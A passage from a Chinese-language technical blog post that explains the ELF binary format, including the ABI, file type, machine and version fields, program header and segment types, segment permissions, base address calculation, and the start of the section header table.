ABI</td></tr><tr><td style="text-align:left">ELFOSABI_NSK</td><td style="text-align:center">14</td><td style="text-align:left">NonStop Kernel ABI</td></tr><tr><td style="text-align:left">ELFOSABI_AROS</td><td style="text-align:center">15</td><td style="text-align:left">AROS ABI</td></tr><tr><td style="text-align:left">ELFOSABI_FENIXOS</td><td style="text-align:center">16</td><td style="text-align:left">Fenix OS ABI</td></tr><tr><td style="text-align:left">ELFOSABI_CLOUDABI</td><td style="text-align:center">17</td><td style="text-align:left">CloudABI</td></tr><tr><td style="text-align:left">ELFOSABI_ARM_AEABI</td><td style="text-align:center">64</td><td style="text-align:left">ARM EABI</td></tr><tr><td style="text-align:left">ELFOSABI_ARM</td><td style="text-align:center">97</td><td style="text-align:left">ARM ABI</td></tr><tr><td style="text-align:left">ELFOSABI_STANDALONE</td><td style="text-align:center">255</td><td style="text-align:left">Standalone (embedded) application</td></tr></tbody></table><h4 id="2-1-6-e-ident-EI-ABIVERSION"><a href="#2-1-6-e-ident-EI-ABIVERSION" class="headerlink" title="2.1.6 e_ident[EI_ABIVERSION]"></a>2.1.6 e_ident[EI_ABIVERSION]</h4><p>&emsp;&emsp;e_ident[EI_ABIVERSION]用于进一步指定ABI的版本。此字段用于区分ABI的不兼容版本。它的解释取决于能够运行此文件的目标操作系统ABI，也就是EI_OSABI字段标识的ABI。如果没有为目标文件的EI_OSABI字段指定值，或者没有为由EI_OSABI字节的特定值确定的ABI指定版本值，则使用0用于指示未指定[^6]。</p><p>&emsp;&emsp;Linux内核(至少在版本2.6之后)没有定义它，所以它被静态链接的可执行文件忽略。在这种情况下，EI_PAD的值为8。在glibc 2.12+中，如果e_ident[EI_OSABI]==3，则将此字段视为动态链接器的ABI版本：它定义了动态链接器的特性列表，将e_ident[EI_ABIVERSION]作为共享对象(可执行程序库或动态库)请求的特性级别，并在请求未知特性时拒绝加载它，即e_ident[EI_ABIVERSION]大于最大的已知特性[^2]。</p><h4 id="2-1-7-EI-PAD"><a href="#2-1-7-EI-PAD" class="headerlink" title="2.1.7 EI_PAD"></a>2.1.7 EI_PAD</h4><p>&emsp;&emsp;EI_PAD为e_ident[]中未使用字节的起始索引。这些字节被保留并置为0；处理目标文件的程序应该忽略它们。如果之后这些字节被使用，EI_PAD的值就会改变。</p><h3 id="2-2-目标文件类型-e-type"><a href="#2-2-目标文件类型-e-type" class="headerlink" title="2.2 目标文件类型(e_type)"></a>2.2 目标文件类型(e_type)</h3><p>&emsp;&emsp;e_type标识目标文件类型。</p><p style="text-align:center;font-weight:bold;margin:-10px 0px">Table 2-6：e_type Value</p><table><thead><tr><th style="text-align:left">宏名称</th><th style="text-align:center">值</th><th style="text-align:left">含义</th></tr></thead><tbody><tr><td style="text-align:left">ET_NONE</td><td style="text-align:center">0</td><td style="text-align:left">无文件类型</td></tr><tr><td style="text-align:left">ET_REL</td><td style="text-align:center">1</td><td style="text-align:left">可重定位文件</td></tr><tr><td style="text-align:left">ET_EXEC</td><td style="text-align:center">2</td><td style="text-align:left">可执行文件</td></tr><tr><td style="text-align:left">ET_DYN</td><td style="text-align:center">3</td><td style="text-align:left">共享目标文件</td></tr><tr><td style="text-align:left">ET_CORE</td><td style="text-align:center">4</td><td style="text-align:left">核心转储文件</td></tr><tr><td style="text-align:left">ET_NUM</td><td style="text-align:center">5</td><td style="text-align:left">定义的文件类型数量</td></tr><tr><td style="text-align:left">ET_LOOS</td><td style="text-align:center">0xFE00</td><td style="text-align:left">特定操作系统目标文件类型值范围的下限</td></tr><tr><td style="text-align:left">ET_HIOS</td><td style="text-align:center">0xFEFF</td><td style="text-align:left">特定操作系统目标文件类型值范围的上限</td></tr><tr><td style="text-align:left">ET_LOPROC</td><td style="text-align:center">0xFF00</td><td style="text-align:left">特定处理器目标文件类型值范围的下限</td></tr><tr><td style="text-align:left">ET_HIPROC</td><td style="text-align:center">0xFFFF</td><td style="text-align:left">特定处理器目标文件类型值范围的上限</td></tr></tbody></table><p>&emsp;&emsp;虽然核心转储文件的内容没有被详细说明，但ET_CORE还是被保留用于标识此类文件。从ET_LOPROC到ET_HIPROC(包括边界)被保留用于特定处理器的场景。其他值被保留，并在未来根据需要分配给新的目标文件类型。</p><h3 id="2-3-处理器架构-e-machine"><a href="#2-3-处理器架构-e-machine" class="headerlink" title="2.3 处理器架构(e_machine)"></a>2.3 处理器架构(e_machine)</h3><p>&emsp;&emsp;e_machine指定了当前文件可以运行的处理器架构(指令集)。下面列出一些常见处理器架构(我见过的)对应的编码：</p><p style="text-align:center;font-weight:bold;margin:-10px 0px">Table 2-7：e_machine Value</p><table><thead><tr><th style="text-align:left">宏名称</th><th style="text-align:center">值</th><th style="text-align:left">含义</th></tr></thead><tbody><tr><td style="text-align:left">EM_NONE</td><td style="text-align:center">0</td><td style="text-align:left">无机器类型</td></tr><tr><td style="text-align:left">EM_M32</td><td style="text-align:center">1</td><td style="text-align:left">AT&amp;T WE 32100</td></tr><tr><td style="text-align:left">EM_SPARC</td><td style="text-align:center">2</td><td style="text-align:left">SUN SPARC</td></tr><tr><td style="text-align:left">EM_386</td><td style="text-align:center">3</td><td style="text-align:left">Intel 80386(x86)</td></tr><tr><td style="text-align:left">EM_68K</td><td style="text-align:center">4</td><td style="text-align:left">Motorola 68000(M68k)</td></tr><tr><td style="text-align:left">EM_88K</td><td style="text-align:center">5</td><td style="text-align:left">Motorola 88000(M88k)</td></tr><tr><td style="text-align:left">EM_860</td><td style="text-align:center">7</td><td style="text-align:left">Intel 80860</td></tr><tr><td style="text-align:left">EM_MIPS</td><td style="text-align:center">8</td><td style="text-align:left">MIPS R3000 big-endian</td></tr><tr><td style="text-align:left">EM_MIPS_RS3_LE</td><td style="text-align:center">10</td><td style="text-align:left">MIPS R3000 little-endian</td></tr><tr><td style="text-align:left">EM_MIPS_RS4_BE</td><td style="text-align:center">10</td><td style="text-align:left">MIPS R4000 big-endian</td></tr><tr><td style="text-align:left">EM_PPC</td><td style="text-align:center">20</td><td style="text-align:left">PowerPC</td></tr><tr><td style="text-align:left">EM_PPC64</td><td style="text-align:center">21</td><td style="text-align:left">PowerPC 64-bit</td></tr><tr><td style="text-align:left">EM_ARM</td><td style="text-align:center">40</td><td style="text-align:left">ARM 32-bit(up to ARMv7/Aarch32)</td></tr><tr><td style="text-align:left">EM_SPARCV9</td><td style="text-align:center">43</td><td style="text-align:left">SPARC v9 64-bit</td></tr><tr><td style="text-align:left">EM_IA_64</td><td style="text-align:center">50</td><td style="text-align:left">HP/Intel IA-64</td></tr><tr><td style="text-align:left">EM_X86_64</td><td style="text-align:center">62</td><td style="text-align:left">AMD x86-64</td></tr><tr><td style="text-align:left">EM_MSP430</td><td style="text-align:center">105</td><td style="text-align:left">Texas Instruments msp430</td></tr><tr><td style="text-align:left">EM_ALTERA_NIOS2</td><td style="text-align:center">113</td><td style="text-align:left">Altera Nios II</td></tr><tr><td style="text-align:left">EM_AARCH64</td><td style="text-align:center">183</td><td style="text-align:left">ARM 64-bit(ARMv8/Aarch64)</td></tr><tr><td style="text-align:left">EM_AVR32</td><td style="text-align:center">185</td><td style="text-align:left">Amtel 32-bit microprocessor</td></tr><tr><td style="text-align:left">EM_STM8</td><td style="text-align:center">186</td><td style="text-align:left">STMicroelectronics STM8</td></tr><tr><td style="text-align:left">EM_RISCV</td><td style="text-align:center">243</td><td style="text-align:left">RISC-V</td></tr><tr><td style="text-align:left">EM_BPF</td><td style="text-align:center">247</td><td style="text-align:left">Linux BPF – in-kernel virtual machine</td></tr></tbody></table><p>&emsp;&emsp;其中“EM”应该是“ELF Machine”的简写。</p><p>&emsp;&emsp;其他值被保留并将根据需要分配给新机器。此外，特定处理器的ELF名称使用机器名称来进行区分。例如，下面提到的标志使用前缀EF_(ELF Flag)。在EM_XYZ机器上名叫WIDGET的标志将被称为EF_XYZ_WIDGET。</p><h3 id="2-4-目标文件版本-e-version）"><a href="#2-4-目标文件版本-e-version）" class="headerlink" title="2.4 目标文件版本(e_version）"></a>2.4 目标文件版本(e_version）</h3><p>&emsp;&emsp;e_version标识目标文件的版本。</p><p style="text-align:center;font-weight:bold;margin:-10px 0px">Table 2-8：e_version Value</p><table><thead><tr><th style="text-align:left">宏名称</th><th style="text-align:center">值</th><th style="text-align:left">含义</th></tr></thead><tbody><tr><td style="text-align:left">EV_NONE</td><td style="text-align:center">0</td><td style="text-align:left">无效版本</td></tr><tr><td style="text-align:left">EV_CURRENT</td><td style="text-align:center">&gt;=1</td><td style="text-align:left">当前版本</td></tr></tbody></table><p>&emsp;&emsp;1表示原始文件格式；未来扩展(extensions)新的版本的时候将使用更大的数字。虽然在上面EV_CURRENT的值为1，但是为了反映当前版本号，它可能会改变，比如ELF到现在也就是1.2版本。</p><h2 id="3-程序头表-Program-Header-Table"><a href="#3-程序头表-Program-Header-Table" class="headerlink" title="3 程序头表(Program Header Table)"></a>3 程序头表(Program Header Table)</h2><p>&emsp;&emsp;可执行文件(Executable File)或共享目标文件(Shared Object File)的程序头表(Program Header Table)是一个结构体数组，每一个元素的类型是Elfxx_Phdr，描述了系统准备执行程序时所需的一个段(Segment)的信息或其他信息。一个目标文件的段包含一个或多个节(Section)。程序头仅对可执行文件和共享目标文件有意义。一个文件用ELF头(ELF Header)中的e_phentsize和e_phnum成员指定它自己的程序头表表项的大小和程序头表的项数。</p><p>&emsp;&emsp;可以说，程序头表(Program Header Table)就是专门为ELF文件运行时中的段(Segment)所准备的。程序头表表项所使用的结构体Elfxx_Phdr的定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PN_XNUM0xffff</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    Elf32_Wordp_type;<span class="comment">/* Segment type */</span></span><br><span class="line">    Elf32_Offp_offset;<span class="comment">/* Segment file offset */</span></span><br><span class="line">    Elf32_Addrp_vaddr;<span class="comment">/* Segment virtual address */</span></span><br><span class="line">    Elf32_Addrp_paddr;<span class="comment">/* Segment physical address */</span></span><br><span class="line">    Elf32_Wordp_filesz;<span class="comment">/* Segment size in file */</span></span><br><span class="line">    Elf32_Wordp_memsz;<span class="comment">/* Segment size in memory */</span></span><br><span class="line">    Elf32_Wordp_flags;<span class="comment">/* Segment flags */</span></span><br><span class="line">    Elf32_Wordp_align;<span class="comment">/* Segment alignment */</span></span><br><span class="line">&#125; Elf32_Phdr;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    Elf64_Wordp_type;<span class="comment">/* Segment type */</span></span><br><span class="line">    Elf64_Wordp_flags;<span class="comment">/* Segment flags */</span></span><br><span class="line">    Elf64_Offp_offset;<span class="comment">/* Segment file offset */</span></span><br><span class="line">    Elf64_Addrp_vaddr;<span class="comment">/* Segment virtual address */</span></span><br><span class="line">    Elf64_Addrp_paddr;<span class="comment">/* Segment physical address */</span></span><br><span class="line">    Elf64_Xwordp_filesz;<span class="comment">/* Segment size in file */</span></span><br><span class="line">    Elf64_Xwordp_memsz;<span class="comment">/* Segment size in memory */</span></span><br><span class="line">    Elf64_Xwordp_align;<span class="comment">/* Segment alignment */</span></span><br><span class="line">&#125; Elf64_Phdr;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;各个字段的含义如下：</p><ul><li><strong><code>p_type</code></strong>: 这个成员告诉该数组元素描述了什么样的段(Segment)或者如何解释该数组元素的信息。其类型值及其含义见下方。</li><li><strong><code>p_offset</code></strong>: 该成员给出了从文件开始到该段(Segment)开头的第一个字节的偏移量。</li><li><strong><code>p_vaddr</code></strong>: 该成员给出了该段(Segment)第一个字节在内存中的虚拟地址(Virtual Address)。</li><li><strong><code>p_paddr</code></strong>: 该成员仅用于物理地址寻址相关的系统中，该成员保留用于段(Segment)的物理地址。由于“System V”忽略了应用程序的物理寻址，可执行文件(Executable File)或共享目标文件(Shared Object File)的该项内容并未被限定。</li><li><strong><code>p_filesz</code></strong>: 该成员给出了文件映像中该段(Segment)的大小，可能为0。</li><li><strong><code>p_memsz</code></strong>: 该成员给出了内存映像中该段(Segment)的大小，可能为0。</li><li><strong><code>p_flags</code></strong>: 该成员给出了与段(Segment)相关的标记。详细内容见下方。</li><li><strong><code>p_align</code></strong>: 可加载的程序的段(Segment)的p_vaddr以及p_offset的大小必须是page的整数倍。该成员给出了段在文件以及内存中的对齐方式。如果该值为0或1的话，表示不需要对齐。除此之外，p_align应该是2的整数指数次方，并且p_vaddr与p_offset在模p_align的情况下，结果应该相等。</li></ul><p>&emsp;&emsp;PN_XNUM(0xFFFF)为e_phnum的特殊值。这表明程序头(Program Header Table)的实际数量太大而无法放入e_phnum，因此实际值位于节头表(Section Header Table)第0个节头(Section Header)的sh_info字段中。</p><h3 id="3-1-段类型-p-type"><a href="#3-1-段类型-p-type" class="headerlink" title="3.1 段类型(p_type)"></a>3.1 段类型(p_type)</h3><p>&emsp;&emsp;一些条目描述了进程段(Process Segments)，另外一些条目则提供补充信息，但与进程映像没有关系(Process Image)。</p><p style="text-align:center;font-weight:bold;margin:-10px 0px">Table 3-1：Segment Types</p><table><thead><tr><th style="text-align:left">宏名称</th><th style="text-align:center">值</th><th style="text-align:left">含义</th></tr></thead><tbody><tr><td style="text-align:left">PT_NULL</td><td style="text-align:center">0</td><td style="text-align:left">该数组元素未使用。除p_type外，其他结构体成员的值都是未定义的。这种类型可以使程序头表(Program Header Table)忽略此条目。</td></tr><tr><td style="text-align:left">PT_LOAD</td><td style="text-align:center">1</td><td style="text-align:left">此类型段为一个可加载的段，大小由p_filesz和p_memsz描述。文件中该段的内容被映射到相应内存段的开始处。如果p_memsz大于p_filesz，“剩余”的字节都要被置为0并跟踪段的初始化区域。p_filesz不能大于p_memsz。可加载的段在程序头表中按照p_vaddr升序排列。</td></tr><tr><td style="text-align:left">PT_DYNAMIC</td><td style="text-align:center">2</td><td style="text-align:left">此类型段给出动态链接信息，具体参见ELF手册Book III。</td></tr><tr><td style="text-align:left">PT_INTERP</td><td style="text-align:center">3</td><td style="text-align:left">此类型段给出了一个以Null结尾的字符串的位置和长度，该字符串将被当作解释器的路径名进行调用。这种段类型仅对可执行文件有意义(也可能出现在共享目标文件中)。此外，这种段在一个文件中最多出现一次。而且该段类型的数组元素存在的话，它必须在所有可加载段条目的前面。</td></tr><tr><td style="text-align:left">PT_NOTE</td><td style="text-align:center">4</td><td style="text-align:left">此类型段给出附加信息的位置和大小。</td></tr><tr><td style="text-align:left">PT_SHLIB</td><td style="text-align:center">5</td><td style="text-align:left">该段类型被保留，不过语义未指定。而且，包含这种类型数组元素的程序不符合Unix System V的ELF标准，具体参见ELF手册Book III。</td></tr><tr><td style="text-align:left">PT_PHDR</td><td style="text-align:center">6</td><td style="text-align:left">该段类型的数组元素如果存在的话，则给出了程序头表自身在文件和程序内存映像中的的位置和大小。此类型的段在文件中最多出现一次。此外，只有程序头表是程序内存映像的一部分时，该段类型的数组元素才会存在。如果该段类型的数组元素存在，则必须在所有可加载段条目的前面。</td></tr><tr><td style="text-align:left">PT_TLS</td><td style="text-align:center">7</td><td style="text-align:left">该段类型的数组元素给出线程本地存储段(TLS)的信息。</td></tr><tr><td style="text-align:left">PT_LOOS</td><td style="text-align:center">0x60000000</td><td style="text-align:left">特定操作系统段类型值的下限。</td></tr><tr><td style="text-align:left">PT_GNU_EH_FRAME</td><td style="text-align:center">0x6474E550</td><td style="text-align:left">该段类型数组元素指定异常处理信息的位置和大小(由.eh_frame_hdr节定义)[^5]。</td></tr><tr><td style="text-align:left">PT_GNU_STACK</td><td style="text-align:center">0x6474E551</td><td style="text-align:left">该段类型数组元素中的p_flags成员指定包含栈的段的权限，并用于指示栈是否应该是可执行的。没有此段类型的数组元素，则表示该栈将是可执行的[^5]。</td></tr><tr><td style="text-align:left">PT_GNU_RELRO</td><td style="text-align:center">0x6474E552</td><td style="text-align:left">该段类型数组元素指定了一个在重定位后可以被置为只读的段的位置和大小[^5]。</td></tr><tr><td style="text-align:left">PT_GNU_PROPERTY</td><td style="text-align:center">0x6474E553</td><td style="text-align:left">该段类型数组元素指定.note.gnu.property节的位置和大小。</td></tr><tr><td style="text-align:left">PT_HIOS</td><td style="text-align:center">0x6FFFFFFF</td><td style="text-align:left">特定操作系统段类型值的上限。</td></tr><tr><td style="text-align:left">PT_LOPROC</td><td style="text-align:center">0x70000000</td><td style="text-align:left">特定处理器段类型值的下限。</td></tr><tr><td style="text-align:left">PT_HIPROC</td><td style="text-align:center">0x7FFFFFFF</td><td style="text-align:left">特定处理器段类型值的上限。</td></tr></tbody></table><blockquote><p>注意：除非其他地方特别要求，所有程序头段类型都是可选的。也就是说，文件的程序头表可能只包含与其内容相关的那些元素。</p></blockquote><h3 id="3-2-段权限-p-flags"><a href="#3-2-段权限-p-flags" class="headerlink" title="3.2 段权限(p_flags)"></a>3.2 段权限(p_flags)</h3><p>&emsp;&emsp;被系统加载到内存中的程序至少有一个可加载的段(PT_LOAD)。当系统为可加载的段创建内存映像时，它会按照p_flags为段(Segments)设置相应的访问权限。</p><p style="text-align:center;font-weight:bold;margin:-10px 0px">Table 3-2：Segment Flag Bits, p_flags</p><table><thead><tr><th style="text-align:left">宏名称</th><th style="text-align:center">值</th><th style="text-align:left">含义</th></tr></thead><tbody><tr><td style="text-align:left">PF_X</td><td style="text-align:center">0x1</td><td style="text-align:left">段具有可执行权限</td></tr><tr><td style="text-align:left">PF_W</td><td style="text-align:center">0x2</td><td style="text-align:left">段具有写权限</td></tr><tr><td style="text-align:left">PF_R</td><td style="text-align:center">0x4</td><td style="text-align:left">段具有读权限</td></tr><tr><td style="text-align:left">PF_MASKOS</td><td style="text-align:center">0x0FF00000</td><td style="text-align:left">为特定操作系统预留</td></tr><tr><td style="text-align:left">PF_MASKPROC</td><td style="text-align:center">0xF0000000</td><td style="text-align:left">为特定处理器预留</td></tr></tbody></table><p>&emsp;&emsp;其中，所有在PF_MASKOS中的比特位都是被保留用于与操作系统相关的语义信息。所有在PF_MASKPROC中的比特位都是被保留用于与处理器相关的语义信息。如果指定了含义，则操作系统和处理器补充说明它们。</p><p>&emsp;&emsp;如果权限位为0，则拒绝该类型的访问。实际的内存权限取决于相应的内存管理单元，这可能因系统而异。尽管所有的权限组合都是可以的，但是系统一般会授予比请求更多的权限。在任何情况下，除非明确说明，否则段不会有写权限。下表显示了确切的标志解释和允许的标志解释。符合工具接口标准(Tool Interface Standard,TIS)的系统可以设置任何一种。</p><p style="text-align:center;font-weight:bold;margin:-10px 0px">Table 3-3：Segment Permissions</p><table><thead><tr><th style="text-align:left">宏名称</th><th style="text-align:center">值</th><th style="text-align:left">准确的权限</th><th style="text-align:left">允许的权限</th></tr></thead><tbody><tr><td style="text-align:left">none</td><td style="text-align:center">0</td><td style="text-align:left">拒绝所有访问</td><td style="text-align:left">拒绝所有访问</td></tr><tr><td style="text-align:left">PF_X</td><td style="text-align:center">1</td><td style="text-align:left">只执行</td><td style="text-align:left">读，执行</td></tr><tr><td style="text-align:left">PF_W</td><td style="text-align:center">2</td><td style="text-align:left">只写</td><td style="text-align:left">读，写，执行</td></tr><tr><td style="text-align:left">PF_W + PF_X</td><td style="text-align:center">3</td><td style="text-align:left">写，执行</td><td style="text-align:left">读，写，执行</td></tr><tr><td style="text-align:left">PF_R</td><td style="text-align:center">4</td><td style="text-align:left">只读</td><td style="text-align:left">读，执行</td></tr><tr><td style="text-align:left">PF_R + PF_X</td><td style="text-align:center">5</td><td style="text-align:left">读，执行</td><td style="text-align:left">读，执行</td></tr><tr><td style="text-align:left">PF_R + PF_W</td><td style="text-align:center">6</td><td style="text-align:left">读，写</td><td style="text-align:left">读，写，执行</td></tr><tr><td style="text-align:left">PF_R + PF_W + PF_X</td><td style="text-align:center">7</td><td style="text-align:left">读，写，执行</td><td style="text-align:left">读，写，执行</td></tr></tbody></table><p>&emsp;&emsp;例如，一般来说，代码段一般具有读和执行权限，但是不会有写权限。数据段一般具有写，读，以及执行权限。</p><h3 id="3-3-段内容-Segment-Contents"><a href="#3-3-段内容-Segment-Contents" class="headerlink" title="3.3 段内容(Segment Contents)"></a>3.3 段内容(Segment Contents)</h3><p>&emsp;&emsp;一个目标文件段(Segment)可能包括一到多个节(Section)，尽管这对程序头(Program Header)是透明的。文件的段(Segment)是否包含一个或多个节(Section)并不会影响程序的加载。尽管如此，我们也必须需要各种各样的数据来使得程序可以执行以及动态链接等等。下面会给出一般情况下的段(Segment)的内容。对于不同的段(Segment)来说，它内部的节(Section)的顺序以及所包含的节(Section)的个数有所不同。此外，与处理相关的约束可能会改变对应的段(Segment)的结构。</p><p>&emsp;&emsp;如下所示，代码段(Text Segment)包含只读的指令以及数据，通常包括以下节(Section)。其他节(Section)也可以驻留在可加载的段(Segment)中。当然这个例子并没有给出所有的可能的段(Segment)内容。</p><p><center><img src="/resources/2021/ELF_FileFormat_Analysis/Figure_3-1：Text_Segment.png" alt="Figure 3-1：Text Segment"></center></p><p style="text-align:center;font-weight:bold;margin-top:-20px">Figure 3-1：Text Segment</p><p>&emsp;&emsp;数据段(Data Segment)包含可写的数据以及指令，通常包括以下节(Section)。</p><p><center><img src="/resources/2021/ELF_FileFormat_Analysis/Figure_3-2：Data_Segment.png" alt="Figure 3-2：Data Segment"></center></p><p style="text-align:center;font-weight:bold;margin-top:-20px">Figure 3-2：Data Segment</p><p>&emsp;&emsp;程序头表(Program Header Table)的PT_DYNAMIC类型的元素指向.dynamic节(Section)。其中，.got节和.plt节包含与地址无关代码和动态链接相关的信息。尽管在上面给出的例子中，.plt节出现在代码段(Text Segment)，但它可以驻留在代码段(Text Segment)或数据段(Data Segment)中，这取决于处理器。</p><p>&emsp;&emsp;.bss节的类型为SHT_NOBITS，虽然它不占用文件中的空间，但它占用段的内存映像的空间。通常情况下，没有初始化的数据在段的尾部，因此，p_memsz才会比p_filesz大。</p><blockquote><p>注意：不同的段(Segment)的内容可能会有所重合，即不同的段(Segment)可能包含相同的节(Section)。</p></blockquote><h3 id="3-4-基地址-Base-Address"><a href="#3-4-基地址-Base-Address" class="headerlink" title="3.4 基地址(Base Address)"></a>3.4 基地址(Base Address)</h3><p>&emsp;&emsp;程序头(Program Header)中的虚拟地址可能并不是程序内存映像中实际虚拟地址。通常来说，可执行文件(Executable File)都会包含绝对地址的代码。为了使得程序可以正常执行，段(Segments)必须在用于构建可执行文件的虚拟地址中。另一方面，共享目标文件(Shared Object File)通常包含与地址无关的代码。这可以使得共享目标文件(Shared Object File)可以被多个进程加载，同时保持程序执行的正确性。尽管系统会为不同的进程选择不同的虚拟地址，但它维护了这些段(Segments)的相对位置。因为地址无关代码使用段(Segments)之间的相对地址来进行寻址，内存中的虚拟地址之间的差值必须与文件中的虚拟地址之间的差值相匹配。内存中任何段(Segments)的虚拟地址与文件中对应的虚拟地址之间的差值对于给定进程中的任何一个可执行文件(Executable File)或共享目标文件(Shared Object File)来说是一个单一常量值。这个差值就是基地址(Base Address)，基地址的一个用途就是在动态链接期间重新定位程序的内存映像。</p><p>&emsp;&emsp;可执行文件(Executable File)或者共享目标文件(Shared Object File)的基地址是在执行过程中由以下三个数值计算得到的：</p><ul><li>虚拟内存加载地址</li><li>最大页面大小</li><li>程序可加载段的最低虚拟地址</li></ul><p>&emsp;&emsp;要计算基地址(Base Address)，首先要确定与PT_LOAD段的最小p_vaddr相关联的内存虚拟地址。然后把该内存虚拟地址调整为与之最接近的最大页面的整数倍，即是基地址(Base Address)。相应的p_vaddr值本身也被调整为与之最接近的最大页面的整数倍。基地址(Base Address)就是调整后的内存虚拟地址和调整后的p_vaddr值之间的差值。根据要加载到内存中的文件的类型，内存虚拟地址可能与p_vaddr相同也可能不同。</p><h2 id="4-节头表-Section-Header-Table"><a href="#4-节头表-Section-Header-Table" class="headerlink" title="4 节头表(Section Header Table)"></a>4 节头表(Section Header Table)</h2><p>&emsp;&emsp;节头表(Section Header Table)在ELF文件的尾部(为什么要放在文件尾部呢？)，但是为了讲解方便，这里将这个表放在这里进行讲解。</p><p>&emsp;&emsp;该结构用于定位ELF文件中的每个节(Section)的具体位置。节头表(Section Header Table)是一个结构体数组，每一个元素的类型是Elfxx_Shdr，描述了一个节(Section)的概要内容。节头表索引是该数组的下标。ELF头(ELF Header)中的e_shoff成员给出了从文件开头到节头表(Section Header Table)的字节偏移。e_shnum告诉了我们节头表包含的表项数；e_shentsize给出了每一表项的大小，以字节为单位。</p><p>&emsp;&emsp;如果节(Section)的数量大于或等于SHN_LORESERVE(0xFF00)，则e_shnum的值为SHN_UNDEF(0)。节头表(Section Header Table)条目的实际数量包含在索引0处的节头的sh_size字段中。否则，初始条目的sh_size成员的值为0。请参见扩展的节头(Extended Section Header)[^6]。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    Elf32_Wordsh_name;<span class="comment">/* Section name (string tbl index) */</span></span><br><span class="line">    Elf32_Wordsh_type;<span class="comment">/* Section type */</span></span><br><span class="line">    Elf32_Wordsh_flags;<span class="comment">/* Section flags */</span></span><br><span class="line">    Elf32_Addrsh_addr;<span class="comment">/* Section virtual addr at execution */</span></span><br><span class="line">    Elf32_Offsh_offset;<span class="comment">/* Section file offset */</span></span><br><span class="line">    Elf32_Wordsh_size;<span class="comment">/* Section size in bytes */</span></span><br><span class="line">    Elf32_Wordsh_link;<span class="comment">/* Link to another section */</span></span><br><span class="line">    Elf32_Wordsh_info;<span class="comment">/* Additional section information */</span></span><br><span class="line">    Elf32_Wordsh_addralign;<span class="comment">/* Section alignment */</span></span><br><span class="line">    Elf32_Wordsh_entsize;<span class="comment">/* Entry size if section holds table */</span></span><br><span class="line">&#125; Elf32_Shdr;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    Elf64_Wordsh_name;<span class="comment">/* Section name (string tbl index) */</span></span><br><span class="line">    Elf64_Wordsh_type;<span class="comment">/* Section type */</span></span><br><span class="line">    Elf64_Xwordsh_flags;<span class="comment">/* Section flags */</span></span><br><span class="line">    Elf64_Addrsh_addr;<span class="comment">/* Section virtual addr at execution */</span></span><br><span class="line">    Elf64_Offsh_offset;<span class="comment">/* Section file offset */</span></span><br><span class="line">    Elf64_Xwordsh_size;<span class="comment">/* Section size in bytes */</span></span><br><span class="line">    Elf64_Wordsh_link;<span class="comment">/* Link to another section */</span></span><br><span class="line">    Elf64_Wordsh_info;<span class="comment">/* Additional section information */</span></span><br><span class="line">    Elf64_Xwordsh_addralign;<span class="comment">/* Section alignment */</span></span><br><span class="line">    Elf64_Xwordsh_entsize;<span class="comment">/* Entry size if section holds table */</span></span><br><span class="line">&#125; Elf64_Shdr;</span><br></pre></td></tr></table></figure><ul><li><strong><code>sh_name</code></strong>: 此成员指定节(Section)的名称，它的值是节头字符串表节(.shstrtab)中内容距节头字符串表节起始的偏移量(以字节为单位)，因此该字段实际是一个数值。字符串表中的具体内容是以Null结尾的字符串。</li><li><strong><code>sh_type</code></strong>: 此成员对该节(Section)的内容和语义进行分类。节(Section)的类型及其说明会在后面进行介绍。</li><li><strong><code>sh_flags</code></strong>: 每一比特代表不同的标志，描述节(Section)是否可写，可执行，需要分配内存等属性。</li><li><strong><code>sh_addr</code></strong>: 如果该节(Section)将出现在进程的内存映像中，则此成员将给出该节(Section)的第一个字节应该在进程映像中的位置。否则，此字段为0。</li><li><strong><code>sh_offset</code></strong>: 此成员给出从文件开头到该节(Section)的第一个字节的偏移量。SHT_NOBITS类型的节(Section)不占用文件的空间，因此其sh_offset成员给出的是概念性的偏移。</li><li><strong><code>sh_size</code></strong>: 此成员给出节(Section)的字节大小。除非节(Section)的类型是SHT_NOBITS，否则该节(Section)占用文件中的sh_size字节。类型为SHT_NOBITS的节大小可能非零，不过却不占用文件中的空间。</li><li><strong><code>sh_link</code></strong>: 此成员给出节头表(Section Header Table)索引链接，其具体的解释依赖于节(Section)类型。</li><li><strong><code>sh_info</code></strong>: 此成员给出附加信息，其解释依赖于节类型。</li><li><strong><code>sh_addralign</code></strong>: 